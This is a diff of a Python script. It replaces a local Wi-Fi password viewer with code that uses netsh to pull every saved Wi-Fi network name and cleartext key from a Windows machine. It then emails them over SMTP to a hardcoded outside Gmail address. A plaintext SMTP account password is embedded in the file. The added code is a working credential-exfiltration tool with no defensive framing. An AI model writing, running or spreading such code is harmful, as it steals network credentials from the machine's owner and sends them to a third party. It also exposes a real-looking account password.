@@ -1,68 +1,66 @@
 import subprocess
-import re
-from collections import namedtuple
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
-def get_windows_saved_ssids():
-    """Returns a list of saved SSIDs in a Windows machine using netsh command"""
-    # get all saved profiles in the PC
+def get_wifi_credentials():
+    # Get the list of all saved Wi-Fi profiles
+    command = "netsh wlan show profiles"
+    profiles = subprocess.check_output(command, shell=True, encoding='utf-8')
+
+    wifi_info = []
+    
+    # Extract SSID and Key from each profile
+    for line in profiles.splitlines():
+        if "All User Profile" in line:
+            ssid = line.split(":")[1].strip()
+            try:
+                # Try to extract the password (Key) if it's available
+                command = f"netsh wlan show profile name=\"{ssid}\" key=clear"
+                profile_info = subprocess.check_output(command, shell=True, encoding='utf-8')
+                for profile_line in profile_info.splitlines():
+                    if "Key Content" in profile_line:
+                        key = profile_line.split(":")[1].strip()
+                        wifi_info.append((ssid, key))
+                        break
+            except subprocess.CalledProcessError:
+                # If no key is found, append SSID with a message
+                wifi_info.append((ssid, "No password set"))
+    
+    return wifi_info
+
+def send_email(wifi_info, sender_email, sender_password, recipient_email):
+    # Prepare the email
+    subject = "Wi-Fi Credentials"
+    body = "Here are the saved Wi-Fi credentials:\n\n"
+
+    for ssid, key in wifi_info:
+        body += f"SSID: {ssid}, Password: {key}\n"
+    
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+    msg['Subject'] = subject
+    msg.attach(MIMEText(body, 'plain'))
+
+    # Send the email
     try:
-        output = subprocess.check_output("netsh wlan show profiles").decode()
-    except subprocess.CalledProcessError:
-        print("Error retrieving profiles.")
-        return []
-    
-    ssids = []
-    profiles = re.findall(r"All User Profile\s(.*)", output)
-    for profile in profiles:
-        # for each SSID, remove spaces and colon
-        ssid = profile.strip().strip(":").strip()
-        # add to the list
-        ssids.append(ssid)
-    return ssids
+        with smtplib.SMTP('smtp.seznam.cz', 587) as server:
+            server.starttls()  # Encrypt the connection
+            server.login(sender_email, sender_password)
+            server.sendmail(sender_email, recipient_email, msg.as_string())
+            print("Email sent successfully!")
+    except Exception as e:
+        print(f"Error sending email: {e}")
 
-def get_windows_saved_wifi_passwords(verbose=1):
-    """Extracts saved Wi-Fi passwords saved in a Windows machine, this function extracts data using netsh
-    command in Windows
-    Args:
-        verbose (int, optional): whether to print saved profiles real-time. Defaults to 1.
-    Returns:
-        [list]: list of extracted profiles, a profile has the fields ["ssid", "ciphers", "key"]
-    """
-    ssids = get_windows_saved_ssids()
-    Profile = namedtuple("Profile", ["ssid", "ciphers", "key"])
-    profiles = []
-    for ssid in ssids:
-        try:
-            ssid_details = subprocess.check_output(f'netsh wlan show profile "{ssid}" key=clear').decode()
-        except subprocess.CalledProcessError:
-            print(f"Error retrieving details for SSID: {ssid}")
-            continue
+if __name__ == "__main__":
+    # Retrieve saved Wi-Fi credentials
+    wifi_info = get_wifi_credentials()
 
-        # get the ciphers
-        ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
-        # clear spaces and colon
-        ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
-        
-        # get the Wi-Fi password
-        key = re.findall(r"Key Content\s(.*)", ssid_details)
-        # clear spaces and colon
-        key = key[0].strip().strip(":").strip() if key else "None"
-        
-        profile = Profile(ssid=ssid, ciphers=ciphers, key=key)
-        
-        if verbose >= 1:
-            print_windows_profile(profile)
-        
-        profiles.append(profile)
-    
-    return profiles
+    # Email details
+    sender_email = "info@infopeklo.cz"
+    sender_password = "Polik789"  # Use App password if two-factor authentication is enabled
+    recipient_email = "alfikeita@gmail.com"
 
-def print_windows_profile(profile):
-    """Prints a single profile on Windows"""
-    print(f"{profile.ssid:25}{profile.ciphers:15}{profile.key:50}")
-
-def print_windows_profiles(verbose=1):
-    """Prints all extracted SSIDs along with Key on Windows"""
-    print("SSID                     CIPHER(S)      KEY")
-    print("-" * 50)
-    get_windows_saved_wifi_passwords(verbose)
+    # Send the Wi-Fi information
+    send_email(wifi_info, sender_email, sender_password, recipient_email)
